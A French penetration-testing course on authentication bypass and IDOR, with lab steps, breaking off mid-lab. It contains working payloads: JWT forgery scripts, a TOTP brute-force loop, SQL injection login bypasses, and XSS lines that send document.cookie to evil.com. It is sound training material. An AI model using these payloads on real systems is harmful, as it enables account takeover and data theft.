# Authentication Bypass et IDOR

L'authentification est le premier rempart de toute application web : si elle peut être contournée, l'ensemble du système est compromis. Ce cours couvre les techniques de bypass d'authentification (JWT, OAuth, sessions, 2FA, reset de mot de passe) et les vulnérabilités d'autorisation IDOR/BOLA qui permettent d'accéder aux ressources d'autres utilisateurs même après une authentification réussie.

> [!warning] Cadre légal strict
> Toutes les techniques présentées ici ne s'appliquent qu'à des environnements de test autorisés : CTF, labs isolés (HackTheBox, TryHackMe, DVWA, WebGoat, PortSwigger Web Academy), ou systèmes pour lesquels vous disposez d'une **autorisation écrite explicite**. L'exploitation non autorisée constitue un délit pénal en France (art. 323-1 à 323-7 du Code pénal), passible de 2 à 5 ans d'emprisonnement et 60 000 à 150 000 € d'amende. En compétition CTF ou bug bounty, lisez le scope attentivement avant d'agir.

---

## 1. JWT — JSON Web Tokens

### 1.1 Structure d'un JWT

Un JWT est un jeton d'authentification signé, transmis en HTTP (header, cookie, ou paramètre). Il encode l'identité et les droits d'un utilisateur sans nécessiter de session côté serveur.

```
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c
```

Un JWT est composé de **trois parties séparées par des points**, chacune encodée en Base64URL (pas Base64 standard — pas de padding `=`, `-` remplace `+`, `_` remplace `/`) :

```
HEADER.PAYLOAD.SIGNATURE
```

**Header** — spécifie l'algorithme de signature :
```json
{
  "alg": "HS256",
  "typ": "JWT"
}
```

**Payload** — contient les claims (affirmations sur l'utilisateur) :
```json
{
  "sub": "1234567890",
  "user": "alice",
  "role": "user",
  "iat": 1716000000,
  "exp": 1716003600
}
```

**Signature** — garantit l'intégrité du token :
```
HMACSHA256(
  base64UrlEncode(header) + "." + base64UrlEncode(payload),
  secret
)
```

> [!info] Décoder un JWT en ligne
> Utilisez **jwt.io** pour décoder et inspecter un JWT. Attention : ne collez jamais un token de production dans un outil en ligne.

```bash
# Décoder manuellement (Base64URL → JSON)
echo "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9" | base64 -d
# {"alg":"HS256","typ":"JWT"}

echo "eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9" | base64 -d
# {"user":"alice","role":"user"}
```

### 1.2 Attaque alg:none — suppression de la signature

L'attaque la plus classique et la plus dévastatrice. Certaines bibliothèques JWT acceptent l'algorithme `none`, qui signifie "pas de signature requise". L'attaquant modifie le header pour indiquer `none`, forge le payload avec les droits qu'il veut, et envoie un token sans signature valide.

**Étapes détaillées :**

```python
import base64
import json

# Étape 1 : Partir d'un JWT valide obtenu après connexion normale
original_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"

# Étape 2 : Modifier le header → alg: none
header = {"alg": "none", "typ": "JWT"}
payload = {"user": "admin", "role": "admin"}  # Élévation de privilèges

# Étape 3 : Encoder en Base64URL (sans padding)
def b64url_encode(data):
    return base64.urlsafe_b64encode(json.dumps(data, separators=(',',':')).encode()).rstrip(b'=').decode()

forged_header  = b64url_encode(header)
forged_payload = b64url_encode(payload)

# Étape 4 : Signature vide (le point final est obligatoire)
forged_jwt = f"{forged_header}.{forged_payload}."

print(forged_jwt)
# eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJ1c2VyIjoiYWRtaW4iLCJyb2xlIjoiYWRtaW4ifQ.
```

> [!warning] Variations de l'attaque
> Essayer aussi : `"alg": "None"`, `"alg": "NONE"`, `"alg": "nOnE"` — certaines bibliothèques sont sensibles à la casse dans leur liste de blocage.

### 1.3 Attaque de confusion d'algorithme — HS256 → RS256

Cette attaque exploite la confusion entre algorithme symétrique (HMAC) et asymétrique (RSA). Si le serveur utilise RS256, la clé de vérification est la clé **publique** RSA (non secrète). L'attaquant peut récupérer cette clé publique et s'en servir comme secret HMAC pour forger un token HS256.

```
Serveur RS256 :
  - Signe avec clé privée RSA
  - Vérifie avec clé publique RSA (disponible publiquement via JWKS)

Attaque de confusion :
  - L'attaquant récupère la clé publique RSA
  - Forge un token signé en HS256 avec la clé publique comme secret
  - Si le serveur ne valide pas l'algorithme, il vérifie en HS256 avec la clé publique → succès
```

```python
import jwt  # PyJWT
import requests

# Étape 1 : Récupérer la clé publique RSA du serveur
# Souvent exposée via /.well-known/jwks.json ou /oauth/jwks
response = requests.get("https://target.com/.well-known/jwks.json")
public_key = extract_public_key(response.json())  # Extraire la clé PEM

# Étape 2 : Forger un token HS256 signé avec la clé publique comme secret
forged_token = jwt.encode(
    {"user": "admin", "role": "admin"},
    public_key,       # Utiliser la clé publique comme secret HMAC
    algorithm="HS256"
)

print(forged_token)
```

### 1.4 Attaque par secret faible — brute force

Si le secret HMAC est faible (mot du dictionnaire, valeur par défaut), il peut être retrouvé par brute force. L'outil **hashcat** et **jwt_tool** permettent cette attaque.

```bash
# Avec hashcat (mode 16500 = JWT HS256/HS384/HS512)
hashcat -a 0 -m 16500 <jwt_token> /usr/share/wordlists/rockyou.txt

# Avec jwt_tool
python3 jwt_tool.py <jwt_token> -C -d /usr/share/wordlists/rockyou.txt

# Secrets communs à tester manuellement
# "secret", "password", "123456", "jwt_secret", "change_me", hostname, ""
```

```python
# Une fois le secret trouvé → forger n'importe quel token
import jwt

SECRET = "secret"  # Secret trouvé par brute force
forged = jwt.encode(
    {"user": "admin", "role": "admin", "exp": 9999999999},
    SECRET,
    algorithm="HS256"
)
```

### 1.5 Bypass d'expiration (exp claim)

Le claim `exp` contient un timestamp Unix. Si la vérification côté serveur est absente ou mal implémentée :

```python
# Modifier exp pour une date très lointaine
payload = {
    "user": "alice",
    "role": "user",
    "exp": 9999999999  # An 2286 — token "immortel"
}

# Cas réel de mauvaise implémentation
# Certaines apps vérifient exp uniquement si le claim est présent
# → Supprimer le claim exp du payload pour un token sans expiration
payload_no_exp = {
    "user": "alice",
    "role": "user"
    # exp absent
}
```

> [!tip] jwt_tool — Swiss army knife JWT
> ```bash
> # Installation
> git clone https://github.com/ticarpi/jwt_tool
> pip3 install -r requirements.txt
>
> # Scanner automatiquement toutes les vulnérabilités JWT
> python3 jwt_tool.py <token> -t https://target.com/api/endpoint -rh "Authorization: Bearer <token>" -M at
>
> # Forger manuellement avec un claim modifié
> python3 jwt_tool.py <token> -T  # Mode interactif
> ```

---

## 2. OAuth 2.0 — Failles et Abus

### 2.1 Fonctionnement d'OAuth 2.0

OAuth 2.0 est un protocole de délégation d'autorisation. Il permet à un utilisateur d'autoriser une application tierce à accéder à ses ressources sans partager son mot de passe.

```
Acteurs :
  Resource Owner  = L'utilisateur (toi)
  Client          = L'application tierce (app.evil.com)
  Authorization Server = Le serveur qui délivre les tokens (accounts.google.com)
  Resource Server = L'API protégée (api.google.com)

Flux Authorization Code (le plus sécurisé) :

  Utilisateur → Client : "Connexion avec Google"
       ↓
  Client → Auth Server : GET /authorize?response_type=code
                              &client_id=xxx
                              &redirect_uri=https://app.com/callback
                              &scope=email+profile
                              &state=RANDOM_VALUE
       ↓
  Auth Server → Utilisateur : Page de consentement
       ↓
  Utilisateur → Auth Server : "J'autorise"
       ↓
  Auth Server → Client : Redirect vers redirect_uri?code=AUTH_CODE&state=VALUE
       ↓
  Client → Auth Server : POST /token {code, client_secret, redirect_uri}
       ↓
  Auth Server → Client : {access_token, refresh_token, id_token}
       ↓
  Client → Resource Server : GET /userinfo (Authorization: Bearer access_token)
```

### 2.2 Open Redirect — vol du code d'autorisation

Si le serveur d'autorisation ne valide pas strictement le `redirect_uri`, l'attaquant peut rediriger le code d'autorisation vers son propre serveur.

```
Requête légitime :
GET /authorize?client_id=app&redirect_uri=https://app.com/callback&...

Requête malveillante :
GET /authorize?client_id=app&redirect_uri=https://evil.com/steal&...
GET /authorize?client_id=app&redirect_uri=https://app.com.evil.com/&...
GET /authorize?client_id=app&redirect_uri=https://app.com/callback%40evil.com&...
GET /authorize?client_id=app&redirect_uri=https://app.com/../../../evil.com&...
```

Si l'utilisateur clique sur ce lien, il autorise l'accès et le code est envoyé à `evil.com`. L'attaquant échange ensuite le code contre un token d'accès.

> [!tip] Techniques de bypass de validation redirect_uri
> | Technique | Exemple |
> |---|---|
> | Ajout de chemin supplémentaire | `https://app.com/callback/../evil` |
> | Sous-domaine | `https://app.com.evil.com/callback` |
> | Encodage URL | `https://app.com%2f@evil.com/` |
> | Paramètre supplémentaire | `https://app.com/callback?x=https://evil.com` |
> | Fragment | `https://app.com/callback#https://evil.com` |

### 2.3 Absence du paramètre state — CSRF sur OAuth

Le paramètre `state` est un nonce aléatoire qui protège contre les attaques CSRF. Si l'application ne le génère pas ou ne le vérifie pas :

```
Attaque CSRF sur OAuth :

1. L'attaquant initie un flux OAuth sur son propre compte
2. Il intercepte la requête de callback avant de la finaliser
3. Il forge un lien : https://victim.com/callback?code=ATTAQUANT_CODE
4. La victime clique sur ce lien (CSRF)
5. Le compte victime est lié au compte de l'attaquant
   → L'attaquant peut maintenant se connecter au compte victime

Vérification côté serveur (correct) :
  1. Générer state = random_secure_token()
  2. Stocker state en session
  3. Inclure dans la requête /authorize
  4. À la réception du callback : vérifier que state reçu == state en session
  5. Si différent → rejeter la requête
```

```python
# Code vulnérable (pas de vérification state)
@app.route('/oauth/callback')
def oauth_callback():
    code = request.args.get('code')
    # ← Aucune vérification du state !
    token = exchange_code_for_token(code)
    login_user(token)

# Code sécurisé
@app.route('/oauth/callback')
def oauth_callback():
    state_received = request.args.get('state')
    state_stored   = session.get('oauth_state')

    if not state_received or state_received != state_stored:
        abort(403, "CSRF détecté — state invalide")

    code = request.args.get('code')
    token = exchange_code_for_token(code)
    login_user(token)
```

### 2.4 Token leakage via Referer

L'access token ou le code d'autorisation peuvent fuiter dans le header `Referer` si la page de callback inclut des ressources tierces (analytics, images externes).

```
1. Callback reçoit : https://app.com/callback?code=AUTH_CODE&state=xyz
2. La page charge une image : <img src="https://analytics.com/pixel.gif">
3. Le navigateur envoie : Referer: https://app.com/callback?code=AUTH_CODE&state=xyz
4. Le serveur d'analytics reçoit le code d'autorisation dans les logs
```

---

## 3. Session Fixation et Session Hijacking

### 3.1 Session Hijacking — vol de session

Le session hijacking consiste à voler l'identifiant de session d'un utilisateur authentifié pour usurper son identité.

```
Méthodes de vol :
┌─────────────────────────────────────────────────────────────┐
│  1. XSS → document.cookie exfiltré vers evil.com            │
│  2. Sniffing réseau (HTTP non chiffré)                       │
│  3. Man-in-the-Middle sur réseau WiFi public                 │
│  4. Log injection → session ID dans les logs                 │
│  5. Prédiction de session ID (algorithme faible)             │
│  6. Fixation de session (voir 3.2)                           │
└─────────────────────────────────────────────────────────────┘
```

```javascript
// Attaque XSS classique pour vol de session
<script>
  fetch('https://evil.com/steal?c=' + document.cookie)
</script>

// Ou via image
<img src="x" onerror="this.src='https://evil.com/?c='+document.cookie">

// Utilisation du cookie volé dans BurpSuite
// → Remplacer son session ID par celui volé dans les requêtes
```

### 3.2 Session Fixation — imposer un session ID connu

Dans l'attaque de session fixation, l'attaquant **impose** un session ID à la victime avant son authentification. Quand la victime se connecte, le serveur associe son authentification à ce session ID connu de l'attaquant.

```
Flux de l'attaque :

1. L'attaquant obtient un session ID valide (non authentifié)
   → GET https://bank.com/  → Set-Cookie: SESSID=ATTAQUANT_CONTROLLED

2. L'attaquant envoie un lien piégé à la victime :
   https://bank.com/login?SESSID=ATTAQUANT_CONTROLLED
   ou dans un email : <a href="https://bank.com/?session=ATTAQUANT_CONTROLLED">Connectez-vous</a>

3. La victime se connecte avec ce session ID fixé

4. Le serveur vulnérable ne régénère PAS le session ID après authentification
   → SESSID=ATTAQUANT_CONTROLLED est maintenant authentifié

5. L'attaquant utilise SESSID=ATTAQUANT_CONTROLLED → accès complet
```

```python
# Implémentation vulnérable (Flask)
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session['user_id'] = user.id  # ← Le session ID existant est réutilisé !
        return redirect('/dashboard')

# Implémentation sécurisée
from flask import session
@app.route('/login', methods=['POST'])
def login():
    user = authenticate(request.form['username'], request.form['password'])
    if user:
        session.clear()                  # ← Vider l'ancienne session
        session.regenerate()             # ← Nouveau session ID après auth
        session['user_id'] = user.id
        return redirect('/dashboard')
```

> [!info] Contre-mesure universelle
> **Toujours régénérer le session ID après une élévation de privilèges** : connexion, changement de mot de passe, activation 2FA, modification d'email. C'est la contre-mesure principale contre la fixation de session.

---

## 4. Bypass de l'Authentification à Deux Facteurs (2FA)

### 4.1 Phishing en temps réel (Real-time Phishing)

Le phishing en temps réel (ou phishing MFA) utilise un proxy interposé entre la victime et le vrai site. Outils comme **Evilginx2** ou **Modlishka** automatisent cette attaque.

```
Architecture du proxy de phishing :

Victime → [Proxy Evilginx2] → Serveur Légitime
                  ↑
         Intercept et stocke :
         - Credentials (user/pass)
         - Code 2FA (TOTP à usage unique)
         - Session cookie post-auth

Flux :
1. Victime reçoit un lien : https://accounts.googIe.com (typosquatting)
2. Le proxy transmet toutes les requêtes au vrai Google en temps réel
3. La victime entre ses credentials → proxy les capture ET les transmet
4. Google envoie le code 2FA → victime l'entre → proxy le capture ET le transmet
5. Google crée une session authentifiée → proxy intercepte le cookie
6. L'attaquant utilise le cookie pour une session indépendante
```

### 4.2 SIM Swapping — hijacking du numéro de téléphone

Le SIM swapping consiste à convaincre l'opérateur téléphonique de transférer le numéro de la victime vers une SIM contrôlée par l'attaquant. Tous les SMS (codes 2FA, codes de récupération) sont alors reçus par l'attaquant.

```
Vecteurs :
  - Ingénierie sociale auprès du service client opérateur
  - Corruption d'employés d'opérateurs
  - Accès à des portails de gestion opérateur mal sécurisés
  - Exploitation de failles SS7 (protocole de signalisation téléphonique)

Impact :
  - 2FA SMS entièrement contourné
  - Récupération de compte via SMS
  - WhatsApp, Telegram, applications bancaires compromis
```

> [!warning] 2FA SMS considéré comme faible
> Le NIST (SP 800-63B) a déprécié le 2FA par SMS comme facteur d'authentification fort depuis 2016. Préférer TOTP (Google Authenticator, Authy) ou les clés physiques (YubiKey, FIDO2).

### 4.3 Brute Force TOTP

Les codes TOTP (Time-based One-Time Password) ont une fenêtre temporelle de 30 secondes et sont des nombres à 6 chiffres (000000 à 999999). Sans limitation de tentatives, ils peuvent être brute-forcés.

```python
# TOTP : seulement 1 000 000 combinaisons possibles
# Avec un taux de 100 req/s → 10 000 secondes = ~2h45
# Mais la fenêtre est de 30s → seulement 1 code valide à la fois

# Attaque par brute force avec rate limiting absent
import requests
import time

target = "https://target.com/api/verify-2fa"
session_cookie = {"session": "STOLEN_SESSION_AFTER_PASSWORD"}

for code in range(0, 1000000):
    r = requests.post(target,
        json={"code": f"{code:06d}"},
        cookies=session_cookie
    )
    if "success" in r.text or r.status_code == 200:
        print(f"[+] Code trouvé : {code:06d}")
        break
    # Pas de sleep si le serveur n'a pas de rate limiting
```

```bash
# Avec BurpSuite Intruder
# 1. Intercepter la requête de vérification 2FA
# 2. Envoyer vers Intruder (Ctrl+I)
# 3. Marquer le champ code comme payload position
# 4. Payload type : Numbers, de 000000 à 999999, step 1, min digits 6
# 5. Lancer et chercher une réponse différente (longueur ou status code)
```

### 4.4 Backup Codes et Recovery

```
Vecteurs d'attaque sur les mécanismes de récupération :
  1. Backup codes stockés en clair dans la base de données → dump SQL → accès
  2. Backup codes prévisibles (générés avec un seed faible)
  3. Questions de sécurité trop faciles (lieu de naissance, prénom du chien)
  4. Récupération par email non sécurisée → combinaison avec compromission email
  5. Support client vulnérable à l'ingénierie sociale ("j'ai perdu mon téléphone")
```

### 4.5 Bypass par manipulation de réponse

Certaines implémentations 2FA vérifient côté client si le code est valide, ou acceptent des réponses manipulées.

```
Techniques avec BurpSuite :

1. Manipulation de la réponse serveur :
   - Intercepter la réponse à une vérification 2FA échouée
   - Modifier {"success": false} → {"success": true}
   - Modifier le code HTTP 401 → 200

2. Manipulation de la requête :
   - Essayer code=null, code=undefined, code=[], code={"$gt": 0}
   - Essayer de supprimer le champ code entièrement
   - Tester code=000000 avec un token valide (race condition)

3. Race condition :
   - Envoyer simultanément la vérification 2FA ET la requête d'accès
   - Si le serveur vérifie 2FA puis accorde l'accès en deux étapes séparées
     → Arriver sur la deuxième étape sans avoir passé la première
```

---

## 5. Failles dans la Réinitialisation de Mot de Passe

### 5.1 Host Header Injection

L'application utilise souvent le header `Host` pour générer le lien de reset envoyé par email. Si ce header n'est pas validé, l'attaquant peut faire pointer le lien vers son propre serveur.

```http
# Requête légitime
POST /forgot-password HTTP/1.1
Host: app.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# Email généré : https://app.com/reset?token=SECURE_TOKEN

---

# Requête malveillante avec Host header modifié
POST /forgot-password HTTP/1.1
Host: evil.com
Content-Type: application/x-www-form-urlencoded

email=victim@example.com

# Email généré : https://evil.com/reset?token=SECURE_TOKEN
# La victime clique → son token de reset est envoyé à evil.com
```

```bash
# Variations du Host header à tester
Host: evil.com
Host: app.com.evil.com
Host: app.com@evil.com
X-Forwarded-Host: evil.com
X-Host: evil.com
X-Forwarded-Server: evil.com
```

### 5.2 Token Prévisible

Si le token de reset est généré avec un algorithme prévisible (timestamp, ID utilisateur, MD5 d'un email), il peut être forgé.

```python
# Implémentation VULNÉRABLE
import hashlib, time

def generate_reset_token(user_email):
    # Basé sur l'email + timestamp arrondi à la seconde
    return hashlib.md5(f"{user_email}{int(time.time())}".encode()).hexdigest()

# L'attaquant connaît l'email de la victime
# Il connaît l'heure approximative de la demande (timestamp dans l'email reçu)
# → Il brute force les quelques secondes autour de cet instant

# Implémentation SÉCURISÉE
import secrets

def generate_reset_token():
    return secrets.token_urlsafe(32)  # 256 bits d'entropie aléatoire
```

### 5.3 Race Condition sur le Reset

```
Scénario :
1. L'attaquant demande un reset pour son propre compte → token A généré
2. L'attaquant change son email vers l'email de la victime
3. L'attaquant demande un reset pour la victime → token B généré
4. Si le serveur lie token A à l'email victime avant d'invalider token A :
   → L'attaquant utilise token A pour reset le compte victime

Ou : Token valable pendant 15 minutes
   → Race condition si deux resets sont demandés simultanément
   → Le token précédent peut rester valide
```

---

## 6. SQL Injection pour Bypass d'Authentification

### 6.1 Bypass basique — OR 1=1

```sql
-- Code vulnérable
SELECT * FROM users WHERE username='$user' AND password='$pass'

-- Payload classique dans le champ username
' OR '1'='1
-- Résultat : SELECT * FROM users WHERE username='' OR '1'='1' AND password='xxx'
-- → Retourne tous les utilisateurs, connecte avec le premier

-- Plus ciblé : cibler admin spécifiquement
admin'--
-- Résultat : SELECT * FROM users WHERE username='admin'--' AND password='xxx'
-- → Le -- commente le reste → connexion admin sans password

-- Variantes du commentaire selon le SGBD
admin'--          (MySQL, PostgreSQL, SQLite, MSSQL)
admin'#           (MySQL)
admin'/*          (MySQL, Oracle)
```

### 6.2 Stacked Queries et Injection de logique

```sql
-- Contournement si le login vérifie username ET password séparément
-- Champ username :
' OR 1=1--

-- Champ password (si le champ username n'est pas vulnérable) :
' OR '1'='1

-- Bypass avec UNION pour injecter un utilisateur fictif
' UNION SELECT 1,'admin','$2a$10$hashedpassword',1-- -
-- → Si l'app hash le password après la requête, on peut injecter un hash connu

-- Stacked queries (MSSQL, PostgreSQL — pas MySQL via mysql_query)
'; UPDATE users SET password='hacked' WHERE username='admin'--
'; INSERT INTO users VALUES ('hacker','hash_connu','admin')--
```

### 6.3 Bypass avec encodage et obfuscation

```sql
-- Bypass de filtres basiques (blacklist de mots-clés)
' oR '1'='1       -- Casse mixte
' OR/**/'1'='1    -- Commentaire SQL inline
' %4fR '1'='1     -- Encodage URL de 'O'
' OR 0x313d31--   -- Hex encoding de '1=1'
' OR CHAR(49)=CHAR(49)-- -- Fonction CHAR()
```

---

## 7. IDOR — Insecure Direct Object Reference

### 7.1 Définition et contexte

L'IDOR (Insecure Direct Object Reference) est une vulnérabilité d'autorisation qui survient quand une application expose des références directes à des objets internes (ID de base de données, nom de fichier, clé) **sans vérifier que l'utilisateur authentifié est autorisé à accéder à cet objet spécifique**.

> [!info] Terminologie OWASP
> **BOLA** (Broken Object Level Authorization) est le nom utilisé par l'OWASP dans l'API Security Top 10 (API1:2023). C'est exactement la même vulnérabilité qu'IDOR, mais avec un focus sur les APIs REST/GraphQL. Les deux termes sont utilisés interchangeablement en pratique.

```
Différence fondamentale :

IDOR / BOLA = "Tu peux accéder aux ressources des AUTRES utilisateurs"
              (même niveau de privilèges, mauvais objet)

Missing Function Level Access Control = "Tu peux accéder aux FONCTIONS admin"
              (mauvais niveau de privilèges, mauvaise fonction)

Exemple :
  IDOR    : Alice accède au profil de Bob via GET /api/user/456 (Alice = user 123)
  MFLAC   : Alice accède à GET /admin/users (route réservée aux admins)
```

### 7.2 IDOR Horizontal vs Vertical

```
IDOR Horizontal :
  Accès à des ressources d'un utilisateur de MÊME niveau
  Alice (user) → Bob (user) : lecture/modification des données de l'autre

  Exemple :
  Alice connectée, son ID = 123
  GET /api/profile/123 → son propre profil ✅
  GET /api/profile/456 → profil de Bob ← IDOR HORIZONTAL ❌

IDOR Vertical :
  Accès à des ressources d'un utilisateur de NIVEAU SUPÉRIEUR
  Alice (user) → Admin : accès aux données/fonctions admin

  Exemple :
  DELETE /api/user/456      (Alice ne devrait pas pouvoir supprimer d'autres users)
  GET /api/admin/config     (accès à la config réservée aux admins)
  PUT /api/user/456/role → {"role": "admin"}  (auto-promotion)

  Note : IDOR vertical chevauche souvent MFLAC
```

### 7.3 Enumération d'IDs

#### IDs séquentiels (autoincrement)

Les IDs séquentiels sont les plus simples à énumérer : il suffit d'incrémenter ou décrémenter le paramètre.

```bash
# ID visible dans l'URL
GET /api/invoice/1001
GET /api/invoice/1002
GET /api/invoice/1003  ← Factures des autres clients

# ID dans un paramètre de requête
GET /download?file_id=42
GET /download?file_id=43

# ID dans le corps d'une requête POST
POST /api/order/status
{"order_id": 5000}
{"order_id": 5001}
```

```
Avec BurpSuite Intruder :
1. Intercepter : GET /api/invoice/1001
2. Envoyer vers Intruder (Ctrl+I)
3. Marquer §1001§ comme position
4. Payload : Numbers, de 1000 à 1100, step 1
5. Lancer
6. Trier par longueur de réponse : les réponses différentes = IDOR confirmé
```

#### UUIDs et GUIDs

Les UUIDs v4 sont théoriquement non prévisibles (128 bits d'entropie). Cependant :

```
Vecteurs d'attaque sur les UUIDs :
  1. UUID v1 (time-based) → prévisible si l'horloge est connue
  2. UUID présent dans des réponses d'autres endpoints (leakage)
  3. UUID dans les logs, emails, headers de réponse
  4. UUID dans le contenu de la page (référence croisée)
  5. UUID v4 avec entropie réduite (mauvais PRNG)

Exemple de fuite :
  GET /api/user/me → {"id": "550e8400-e29b-41d4-a716-446655440000", "name": "Alice"}
  L'UUID d'Alice est dans la réponse
  → Chercher cet UUID dans d'autres requêtes (logs partagés, notifications)
  → Trouver d'autres UUIDs dans les listes publiques (profils publics, forums)
```

```bash
# UUID v1 : contient timestamp MAC address
# Format : xxxxxxxx-xxxx-1xxx-yxxx-xxxxxxxxxxxx
# Le "1" en position 13 indique la version

# Outil d'analyse UUID v1
python3 -c "
import uuid
u = uuid.UUID('6ba7b810-9dad-11d1-80b4-00c04fd430c8')
print(f'Version: {u.version}')  # 1 = time-based
print(f'Timestamp: {u.time}')   # Horloge UTC de création
"
```

### 7.4 IDOR dans les APIs REST

#### GET — lecture non autorisée

```http
# L'utilisateur authentifié est user_id = 123
# Son token JWT encode {"user_id": 123, "role": "user"}

# Requête normale (son propre profil)
GET /api/v1/user/123 HTTP/1.1
Authorization: Bearer eyJ...

# IDOR : accès au profil d'un autre
GET /api/v1/user/456 HTTP/1.1
Authorization: Bearer eyJ...   ← Même token, ID différent

# Si le serveur retourne les données de l'user 456 → IDOR confirmé
```

```http
# Autres endpoints communs vulnérables à l'IDOR GET
GET /api/orders/ORDER_ID
GET /api/messages/THREAD_ID
GET /api/documents/DOC_ID
GET /api/payments/PAYMENT_ID
GET /api/reports/REPORT_ID
GET /api/admin/users/USER_ID
```

#### PUT/POST/DELETE — modification ou suppression non autorisée

```http
# Modification du profil d'un autre utilisateur
PUT /api/user/456 HTTP/1.1
Authorization: Bearer eyJ...TOKEN_OF_USER_123...
Content-Type: application/json

{"email": "hacker@evil.com", "role": "admin"}

---

# Suppression d'une commande appartenant à un autre
DELETE /api/order/789 HTTP/1.1
Authorization: Bearer eyJ...TOKEN_OF_USER_123...

---

# Auto-promotion via IDOR vertical
PATCH /api/user/123 HTTP/1.1
Authorization: Bearer eyJ...TOKEN_OF_USER_123...
Content-Type: application/json

{"role": "admin"}  ← Le client ne devrait pas pouvoir modifier son propre rôle
```

### 7.5 IDOR dans les Paramètres Cachés, Cookies, et Headers

L'IDOR ne se limite pas à l'URL — les références d'objet peuvent être cachées dans des endroits moins évidents.

```http
# Dans le corps d'une requête (paramètre caché)
POST /api/update-profile HTTP/1.1
Content-Type: application/json

{
  "user_id": 456,    ← IDOR dans le corps
  "name": "Hacker",
  "email": "hacker@evil.com"
}

---

# Dans un cookie
Cookie: user_id=123; session=abc123
# → Modifier user_id=456 dans DevTools ou BurpSuite

---

# Dans un header personnalisé
X-User-ID: 123
X-Account-ID: 5000
X-Forwarded-For: 10.0.0.1

---

# Dans un champ caché HTML (vue source)
<input type="hidden" name="account_id" value="123">
<input type="hidden" name="document_id" value="42">

---

# Dans un paramètre de requête non évident
POST /api/transfer
amount=100&from_account=123&to_account=456
# → Modifier from_account pour transférer depuis le compte d'un autre
```

```bash
# Repérer les références cachées avec BurpSuite
# 1. Activer Proxy → tout le trafic passe par BurpSuite
# 2. Naviguer normalement dans l'application
# 3. Aller dans Target → Site Map → sélectionner le domaine
# 4. Chercher dans les requêtes : "id", "user", "account", "order", "doc"
# 5. Grep : Edit → Find → chercher des patterns numériques ou UUID
```

### 7.6 IDOR Chaîné avec Privilege Escalation

Les IDORs les plus critiques sont ceux qui peuvent être enchaînés pour obtenir une élévation de privilèges complète.

```
Chaîne d'attaque classique :

Étape 1 — IDOR horizontal sur endpoint d'information :
  GET /api/user/456 → {"id": 456, "email": "admin@corp.com", "api_key": "sk_live_xxx"}

Étape 2 — Utilisation de l'api_key admin pour accès privilégié :
  GET /api/admin/users (Authorization: sk_live_xxx)
  → Liste de tous les utilisateurs avec leurs tokens de session

Étape 3 — Réinitialisation de mot de passe admin via token IDOR :
  POST /api/user/1/reset-password
  {"token": "TOKEN_FOUND_VIA_IDOR", "new_password": "hacked"}

→ Compromission complète du système admin
```

```
Autre chaîne courante (API REST) :

1. IDOR GET /api/order/5001 → commande d'un autre client
   Récupère : {"id": 5001, "user_id": 999, "status": "pending"}

2. IDOR PUT /api/order/5001 → modifier la commande
   Body : {"status": "shipped", "delivery_address": "ATTAQUANT_ADRESSE"}
   → Rediriger la livraison

3. IDOR DELETE /api/user/999 → supprimer l'utilisateur victime
   → Couverture des traces
```

---

## 8. Labs Pratiques — BurpSuite

### 8.1 Configuration de BurpSuite

```
Prérequis :
  - BurpSuite Community (gratuit) ou Professional (payant)
  - Firefox avec FoxyProxy configuré (proxy : 127.0.0.1:8080)
  - Certificat CA BurpSuite installé dans Firefox
    (http://burp → Download Certificate → Préférences Firefox → Certificats → Importer)

Modules utilisés :
  ┌─────────────┬──────────────────────────────────────────────────────────┐
  │ Proxy       │ Intercepte et modifie les requêtes HTTP en temps réel    │
  │ Repeater    │ Rejoue et modifie une requête spécifique manuellement     │
  │ Intruder    │ Automatise les attaques (fuzzing, brute force, énumération)│
  │ Decoder     │ Encode/décode Base64, URL, HTML, etc.                     │
  │ Scanner     │ Scan automatique de vulnérabilités (version Pro)          │
  └─────────────┴──────────────────────────────────────────────────────────┘
```

### 8.2 Lab 1 — Enumération IDOR avec Intruder

```
Objectif : Trouver des factures appartenant à d'autres utilisateurs

Environnement : DVWA, WebGoat, ou PortSwigger Web Academy (labs gratuits)
```

```
1. Se connecter à l'application avec un compte test
2. Accéder à une facture personnelle : GET /invoice/1001
3. Dans BurpSuite Proxy → HTTP History → Trouver la requête
4. Clic droit → Send to Intruder

5. Dans Intruder :
   - Tab "Positions" : marquer §1001§
   - Tab "Payloads" :
     Type : Numbers
     From : 1000
     To   : 1100
     Step : 1
   - Désactiver "URL-encode these characters" si l'ID est dans le path

6. Lancer l'attaque (Start Attack)

7. Analyser les résultats :
   - Trier par "Length" (colonne)
   - Les réponses avec une longueur différente = données d'autres utilisateurs
   - Vérifier le Status Code : 200 = trouvé, 403/404 = accès refusé
```

### 8.3 Lab 2 — Manipulation JWT avec Repeater

```
1. Se connecter, récupérer le JWT dans le header Authorization
   Authorization: Bearer eyJhbGciOiJIUzI1NiJ9.eyJ1c2VyIjoiYWxpY2UiLCJyb2xlIjoidXNlciJ9.xxx

2. Copier le token dans le Decoder de BurpSuite :
   - Decode as Base64 → modifier la payload
   - {"user": "admin", "role": "admin"}
   - Re-encoder en Base64

3. Tester l'attaque alg:none :
   - Header : {"alg":"none","typ":"JWT"}
   - Payload : {"user":"admin","role":"admin"}
   - Encoder chaque partie en Base64URL
   - Assembler : HEADER.PAYLOAD. (avec point final, signature vide)

4. Dans Repeater :
   - Coller le token forgé dans le header Authorization
   - Envoyer → observer si l'accès admin est accordé

5. Variations à tester :
   - alg: None, NONE, nOnE
   - Supprimer le champ "typ"
   - Ajouter un claim "admin": true
```

### 8.4 Lab 3 — IDOR dans un corps POST

```
Scénario : API de messagerie interne
  - Utilisateur 123 peut lire ses messages
  - Requête normale : POST /api/messages/read {"message_id": 501}

Test IDOR :
1. Intercepter la requête dans Proxy
2. Send to Repeater

3. Dans Repeater, modifier le body :
   Avant : {"message_id": 501}
   Après : {"message_id": 502}
